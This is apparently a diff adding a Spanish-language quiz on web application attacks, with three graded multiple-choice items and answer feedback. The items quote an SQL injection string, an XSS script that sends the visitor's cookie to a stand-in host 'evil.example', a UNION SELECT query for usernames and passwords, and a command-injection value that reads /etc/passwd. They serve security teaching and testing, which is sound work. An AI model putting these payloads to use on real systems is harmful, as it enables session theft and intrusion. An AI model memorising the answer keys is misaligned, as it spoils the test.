@@ -1,0 +1,22 @@
+$CATEGORY: Ataques a aplicaciones | Núcleo 2
+
+::waf1:: Un atacante escribe ' OR 1=1 -- en el campo de usuario de un formulario de login. ¿Qué ataque es? {
+=Inyección SQL#Correcto: la comilla cierra la cadena y OR 1=1 hace verdadera la condición.
+~Cross-site scripting#Incorrecto: XSS inyecta scripts como <script>alert(1)</script> en el navegador.
+~Phishing#Incorrecto: no hay engaño por correo.
+~DDoS#Incorrecto: no busca agotar recursos.
+}
+
+::waf2:: Un comentario del foro contiene <script>document.location='http://evil.example/?c='+document.cookie</script>. ¿Qué control lo mitiga mejor? {
+=Codificar la salida y aplicar Content-Security-Policy#Correcto.
+~Usar UNION SELECT en la consulta#Incorrecto: UNION SELECT username, password FROM users es una técnica de ataque.
+~Desactivar HTTPS#Incorrecto.
+~Cambiar el puerto 80#Incorrecto.
+}
+
+::waf3:: ¿Qué hace el comando ; cat /etc/passwd agregado a un parámetro que se pasa a la shell? {
+=Inyección de comandos del sistema operativo#Correcto.
+~Inyección SQL ciega#Incorrecto.
+~CSRF#Incorrecto.
+~Clickjacking#Incorrecto.
+}
